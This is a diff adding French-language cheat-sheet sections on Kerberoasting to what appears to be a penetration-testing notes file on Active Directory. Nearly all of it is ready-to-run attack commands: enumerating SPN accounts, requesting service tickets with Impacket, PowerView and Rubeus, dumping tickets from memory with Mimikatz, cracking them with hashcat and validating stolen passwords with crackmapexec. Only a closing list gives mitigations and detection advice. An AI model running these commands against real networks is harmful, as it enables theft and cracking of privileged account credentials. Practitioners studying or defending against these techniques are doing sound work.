@@ -895,7 +895,156 @@ Permet de collecter toutes les relations AD pour générer des graphes d’attaq
 
 ---
 
+# Kerberoasting depuis Linux
 
+## 1. Installer Impacket
+
+Cloner et installer le toolkit :  
+`git clone https://github.com/fortra/impacket.git`  
+`cd impacket`  
+`sudo python3 -m pip install .`
+
+## 2. Lister les comptes avec SPN
+
+Lister les comptes qui ont un SPN :  
+`GetUserSPNs.py -dc-ip <IP_DC> <DOMAINE>/<USER>`
+
+## 3. Récupérer les tickets TGS (pour brute-force)
+
+**Tous les comptes avec SPN :**  
+`GetUserSPNs.py -dc-ip <IP_DC> <DOMAINE>/<USER> -request`
+
+**User précis :**  
+`GetUserSPNs.py -dc-ip <IP_DC> <DOMAINE>/<USER> -request-user <SPNUSER>`
+
+**Sauvegarder dans un fichier**  
+`GetUserSPNs.py -dc-ip <IP_DC> <DOMAINE>/<USER> -request -outputfile kerberoast.hashes`
+
+## 4. Cracker les tickets offline
+
+Avec Hashcat :  
+`hashcat -m 13100 kerberoast.hashes /usr/share/wordlists/rockyou.txt`
+
+## 5. Valider les accès
+
+Tester le mot de passe cracké :  
+`crackmapexec smb <IP_DC> -u <USER> -p '<PASSWORD>'`
+
+## Conseils
+
+- Les comptes avec SPN sont souvent privilégiés.
+- **N’importe quel user du domaine** peut demander un TGS pour ces comptes.
+- Même sans crack, **signaler la présence de SPN** (surtout avec droits).
+- Hashcat prend en entrée les lignes `$krb5tgs$23$...` extraites par Impacket.
+- Toujours valider les credentials crackés !
+- Penser à nettoyer (`rm kerberoast.hashes`) après usage.
+
+---
+
+# Kerberoasting – Windows
+
+## 1. Énumération des SPN (manuelle)
+
+Lister les comptes avec SPN :
+`setspn.exe -Q */*`
+
+Rechercher uniquement les comptes utilisateurs (ignorer les comptes ordinateurs).
+
+## 2. Demande d’un TGS pour un utilisateur spécifique (PowerShell)
+
+Charger l’assembly :
+`Add-Type -AssemblyName System.IdentityModel`
+
+Demander un ticket pour un SPN cible :
+`New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"`
+
+Exemple :  
+`New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"`
+
+## 3. Extraction des tickets TGS de la mémoire avec Mimikatz
+
+Lancer Mimikatz et extraire les tickets :
+`kerberos::list /export`
+
+Générer les fichiers .kirbi (tickets Kerberos exportés).
+
+## 4. Préparation du ticket pour cracking (si export en base64)
+
+Remettre le blob base64 sur une seule ligne :  
+`echo "<base64 blob>" | tr -d \\n`
+
+Décode le fichier .kirbi :  
+`cat encoded_file | base64 -d > sqldev.kirbi`
+
+## 5. Extraction du hash pour Hashcat
+
+Extraire le hash avec kirbi2john :
+`python2.7 kirbi2john.py sqldev.kirbi > crack_file`
+
+Préparer le format Hashcat (si nécessaire) :
+`sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat`
+
+## 6. Cracking offline avec Hashcat
+
+Cracker avec RC4 (type 23) :
+`hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt`
+
+Pour AES-256 (type 18) :
+`hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt`
+
+## 7. Méthodes automatisées (PowerView, Rubeus)
+
+### PowerView (PowerShell)
+
+Charger PowerView :
+`Import-Module .\PowerView.ps1`
+
+Lister tous les users avec SPN :
+`Get-DomainUser * -spn | select samaccountname`
+
+Récupérer le ticket TGS au format Hashcat :
+`Get-DomainUser -Identity <user> | Get-DomainSPNTicket -Format Hashcat`
+
+Exporter tous les tickets au format CSV :
+`Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\out_tgs.csv -NoTypeInformation`
+
+### Rubeus
+
+Lister les options de Kerberoasting :
+`Rubeus.exe kerberoast /?`
+
+Kerberoasting simple :
+`Rubeus.exe kerberoast /nowrap`
+
+Kerberoasting avec filtre admincount :
+`Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap`
+
+Sortie dans un fichier :
+`Rubeus.exe kerberoast /outfile:hashes.txt /nowrap`
+
+Forcer RC4 si possible :
+`Rubeus.exe kerberoast /user:<user> /tgtdeleg /nowrap`
+
+Statistiques sur les comptes Kerberoastables :
+`Rubeus.exe kerberoast /stats`
+
+## 8. Vérification et cracking final
+
+Vérifier le hash extrait :
+`cat sqldev_tgs_hashcat`
+
+Lancer Hashcat selon le type de hash trouvé.
+
+## Conseils, mitigation et détection
+
+- Privilégier des mots de passe longs et complexes pour les comptes avec SPN.
+- Surveiller les événements 4769 (demande de ticket Kerberos) dans les logs de sécurité AD.
+- Limiter ou désactiver RC4 sur les comptes privilégiés.
+- Préférer l’usage des Managed Service Accounts (MSA/gMSA).
+- Ne pas attribuer de SPN à des comptes Domain Admin.
+- Configurer l’audit de la demande de tickets Kerberos via GPO.
+
+---
 
 
 
